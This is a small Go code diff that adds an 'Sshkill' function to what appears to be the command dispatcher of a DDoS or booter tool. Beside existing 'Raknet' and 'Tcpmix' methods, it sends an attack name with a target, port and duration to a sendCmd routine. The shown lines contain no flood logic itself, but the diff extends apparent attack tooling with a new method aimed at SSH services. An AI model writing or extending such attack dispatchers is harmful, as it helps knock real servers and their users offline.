@@ -80,6 +80,10 @@ func Raknet(target string, duration string, port string) {
 	sendCmd("raknet", target, port, duration)
 }
 
+func Sshkill(target string, duration string, port string) {
+	sendCmd("sshkill", target, port, duration)
+}
+
 func Tcpmix(target string, duration string, port string) {
 	sendCmd("tcpmix", target, port, duration)
 }
